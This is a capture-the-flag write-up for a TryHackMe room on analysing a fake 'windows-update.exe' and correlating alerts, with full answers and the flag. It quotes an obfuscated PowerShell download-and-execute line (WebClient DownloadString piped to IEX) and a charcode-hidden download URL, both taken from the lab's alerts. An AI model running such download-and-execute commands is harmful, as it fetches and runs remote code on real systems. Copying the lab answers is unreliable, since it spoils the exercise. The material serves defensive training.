# Shadow Trace - TryHackMe

> Analyze a suspicious file and correlate alerts to identify malicious behavior

**Room Link:** https://tryhackme.com/room/shadowtrace

<img width="1316" height="920" alt="image" src="https://github.com/user-attachments/assets/263021d5-3426-473b-9eff-c03ca6116824" />

---

## Task 1: File Analysis

### Scenario

Manager reports suspicious file on user's machine: `windows-update.exe`

**Goal:** Analyze file, collect IOCs, identify threats

### Using PEStudio

**Tool location:** Desktop/Tools folder

**Steps:**
1. Launch pestudio.exe
2. Drag windows-update.exe into tool
3. Analyze results

### Questions

**Q1: Architecture of windows-update.exe binary?**

Check file properties in pestudio.

- Answer: `64-bit`

---

**Q2: SHA-256 hash of windows-update.exe?**

Displayed automatically in pestudio.

- Answer: `B2A88DE3E3BCFAE4A4B38FA36E884C586B5CB2C2C283E71FBA59EFDB9EA64BFC`

---

**Q3: URL within the file to use as IOC?**

Go to **Indicators** tab in pestudio.

- Answer: `http://tryhatme.com/update/security-update.exe`

---

**Q4: Domain that can be used as IOC?**

**Command:**
```powershell
strings .\Desktop\windows-update.exe | findstr "tryhatme"
```

Look for additional domains in output.

- Answer: `responses.tryhatme.com`

---

**Q5: Decoded flag from suspicious domain?**

From previous output, extract base64 string:
```
VEhNe3lvdV9nMHRfc29tZV9JT0NzX2ZyaWVuZH0=
```

Decode using CyberChef: **From Base64**

- Answer: `THM{you_g0t_some_IOCs_friend}`

---

**Q6: Library related to socket communication?**

Check **Libraries** tab in pestudio.

Look for networking DLL.

- Answer: `WS2_32.dll`

---

## Task 2: Alert Analysis

### Dashboard

Click "View Site" button to access alert dashboard.

Two alerts to analyze:
1. PowerShell execution
2. Chrome activity

### Questions

**Q1: Malicious URL from powershell.exe trigger?**

**PowerShell command:**
```powershell
(new-object system.net.webclient).DownloadString([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String("aHR0cHM6Ly90cnloYXRtZS5jb20vZGV2L21haW4uZXhl"))) | IEX;
```

Extract base64 string:
```
aHR0cHM6Ly90cnloYXRtZS5jb20vZGV2L21haW4uZXhl
```

Decode with CyberChef: **From Base64**

- Answer: `https://tryhatme.com/dev/main.exe`

---

**Q2: Malicious URL from chrome.exe alert?**

**JavaScript code contains CharCode array:**
```
[104,116,116,112,115,58,47,47,114,101,97,108,108,121,115,101,99,117,114,101,117,112,100,97,116,101,46,116,114,121,104,97,116,109,101,46,99,111,109,47,117,112,100,97,116,101,46,101,120,101]
```

**CyberChef recipe:**
- Input: Decimal
- Delimiter: Comma
- Operation: **From Charcode**

- Answer: `https://reallysecureupdate.tryhatme.com/update.exe`

---

**Q3: File name saved in chrome.exe alert?**

Check download section in JavaScript code:
```javascript
a.download='test.txt';
```

- Answer: `test.txt`

---

## Quick Reference

### PEStudio Analysis

**Key tabs:**
- **Properties:** Architecture, file info
- **Indicators:** URLs, IPs, suspicious strings
- **Libraries:** DLLs loaded by binary
- **Strings:** Text embedded in file

### Finding Strings

```powershell
# Windows
strings file.exe | findstr "keyword"

# Search for domains
strings file.exe | findstr "http"
```

### Decoding Techniques

**Base64:**
```
VEhNe3lvdV9nMHRfc29tZV9JT0NzX2ZyaWVuZH0=
↓ CyberChef: From Base64
THM{you_g0t_some_IOCs_friend}
```

**CharCode:**
```
[104,116,116,112,115,58,47,47,...]
↓ CyberChef: From Charcode (Decimal, Comma delimiter)
https://example.com/file.exe
```

### Common IOCs

**File-based:**
- File hash (SHA-256)
- File name
- File size

**Network-based:**
- URLs
- Domains
- IP addresses

**Code-based:**
- Loaded libraries (DLLs)
- API calls
- Embedded strings

### Obfuscation Methods

| Method | Example | Tool |
|--------|---------|------|
| **Base64** | aHR0cHM6Ly8... | CyberChef |
| **CharCode** | [104,116,116...] | CyberChef |
| **Hex** | 48 74 74 70... | CyberChef |
| **XOR** | Encrypted bytes | CyberChef |

---

## Key Takeaways

- **PEStudio** analyzes PE files
- **64-bit** architecture common
- **SHA-256** identifies files uniquely
- **Indicators tab** reveals URLs
- **strings + findstr** finds hidden data
- **Base64** common obfuscation
- **WS2_32.dll** handles sockets
- **PowerShell IEX** executes downloaded code
- **CharCode arrays** hide URLs
- **CyberChef** decodes everything
- **Always check** download names
- **Correlate alerts** for full picture
